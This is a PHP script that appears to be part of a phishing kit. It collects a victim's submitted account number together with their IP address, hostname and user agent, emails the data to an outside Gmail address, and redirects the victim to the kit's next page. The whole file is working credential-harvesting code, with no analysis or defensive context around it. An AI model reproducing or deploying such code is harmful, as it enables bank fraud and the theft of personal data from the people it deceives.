<?php   ob_start();  ?>
<?
include "X-x-X.php";
?>
<?
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "==================================================\n";
$message .= "============xX Kelly Ajayi Xx======\n";
$message .= "Account Number               : ".$_POST['ultras1']."\n";
$message .= "============xX WU Kelly Xx=====\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']." | On Time : ".date("m/d/Y g:i:a")."\n";
$message .= "==================================================\n";

$send="kaspeern@gmail.com";
$subject = "Account Number | ".$_POST['ultras1']." | $ip";
$headers = "From: Kelly<noreply>";
@mail($send,$subject,$message,$from);
@header("Location: oo.php");